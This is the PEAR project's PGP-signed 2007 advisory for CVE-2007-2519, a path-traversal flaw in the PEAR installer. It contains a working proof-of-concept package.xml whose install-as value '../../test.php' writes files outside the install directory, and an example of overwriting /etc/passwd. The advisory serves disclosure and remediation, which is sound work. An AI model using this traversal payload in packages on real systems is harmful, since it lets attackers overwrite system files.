@@ -1,0 +1,157 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+SECURITY VULNERABILITY ANNOUNCEMENT
+May 7, 2007
+
+     Advisory: PEAR installer arbitrary code execution vulnerability
+ Release Date: 2007/05/07
+Last Modified: 2007/05/07
+       Author: Gregory Beaver [cellog@php.net]
+
+  Application: PEAR installer 1.0 - 1.5.3
+     Severity: Could give an attacker (remote package) unprivileged
+               access to crucial system resources
+         Risk: Medium
+Vendor Status: The PEAR project has released an updated version
+   References: http://pear.php.net/advisory-20070507.txt
+               CVE-2007-2519
+
+
+Overview:
+
+The PEAR installer is available from http://pear.php.net/package/PEAR.
+The PEAR installer is used to install PHP-based software packages
+distributed from pear.php.net and PHP extensions from pecl.php.net.
+
+Lack of validation of the install-as attribute in package.xml version
+1.0 and of the <install> tag in package.xml version 2.0 allows
+attackers to install files in any location and possibly overwrite
+crucial system files if the PEAR Installer is running as a
+privileged user.
+
+Details:
+
+  To be vulnerable, a user must explicitly install a publicly released
+malicious package using the PEAR installer, or explicitly install a
+package that depends on a malicious package.
+
+If a file contains an install-as attribute (package.xml version 1.0)
+like so:
+
+ <filelist>
+  <dir name="/">
+   <file name="INSTALL" role="php" install-as="../../test.php" />
+  </dir> <!-- / -->
+ </filelist>
+
+or a <file>/<install> tag (package.xml version 2.0) like so:
+
+ <contents>
+  <dir name="/">
+   <file name="INSTALL" role="php" />
+  </dir> <!-- / -->
+ </contents>
+...
+ <phprelease>
+  <filelist>
+   <install as="../../test.php" name="INSTALL" />
+  </filelist>
+ </phprelease>
+
+The PEAR Installer will install the INSTALL file into a directory two
+levels
+removed from the expected lowest directory as specified in the php_dir
+configuration variable.  For example, if php_dir is
+/usr/local/lib/php, and
+the install-as attribute is ../../../../etc/passwd, the PEAR Installer
+would
+overwrite the /etc/passwd file.
+
+Proof of concept:
+
+create a file named "INSTALL" and save it in the current directory.
+Save the following XML as package.xml, and run "pear install package.xml"
+
+If php_dir is /usr/local/lib/php The file "INSTALL" will be installed into
+/usr/local/test.php
+
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<package version="2.0" xmlns="http://pear.php.net/dtd/package-2.0"
+xmlns:tasks="http://pear.php.net/dtd/tasks-1.0"
+xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+xsi:schemaLocation="http://pear.php.net/dtd/tasks-1.0
+http://pear.php.net/dtd/tasks-1.0.xsd
+http://pear.php.net/dtd/package-2.0
+http://pear.php.net/dtd/package-2.0.xsd">
+ <name>Test_Sec</name>
+ <channel>pear.php.net</channel>
+ <summary>Test security vulnerability</summary>
+ <description>demonstrate install-as vulnerability
+ </description>
+ <lead>
+  <name>Greg Beaver</name>
+  <user>cellog</user>
+  <email>cellog@php.net</email>
+  <active>yes</active>
+ </lead>
+ <date>2007-03-05</date>
+ <version>
+  <release>1.6.0</release>
+  <api>1.6.0</api>
+ </version>
+ <stability>
+  <release>stable</release>
+  <api>stable</api>
+ </stability>
+ <license uri="http://www.php.net/license">PHP License</license>
+ <notes>
+    allow up to latest beta version [tias]
+ </notes>
+ <contents>
+  <dir name="/">
+   <file name="INSTALL" role="php" />
+  </dir> <!-- / -->
+ </contents>
+ <dependencies>
+  <required>
+   <php>
+    <min>4.3.0</min>
+   </php>
+   <pearinstaller>
+    <min>1.4.3</min>
+   </pearinstaller>
+  </required>
+ </dependencies>
+ <phprelease>
+  <filelist>
+   <install as="../../test.php" name="INSTALL" />
+  </filelist>
+ </phprelease>
+
+</package>
+
+
+Disclosure Timeline:
+
+  06. May 2007 - vulnerability discovered by Gregory Beaver
+  08. May 2007 - Public disclosure
+  08. May 2007 - fixed version of PEAR released
+
+Recommendation:
+
+  We strongly recommend to upgrade to the new version
+
+  PEAR 1.5.4
+  pear upgrade PEAR-1.5.4
+  http://pear.php.net/get/PEAR-1.5.4.tgz
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.2.2 (GNU/Linux)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iD8DBQFGP/R0t2kllR+B5WARAhP1AJsGTonXXma69R57Hnozh23XvzalSQCeJBdb
+0mUJLA2yD1ZxI0wSYMj80wU=
+=wIGV
+-----END PGP SIGNATURE-----
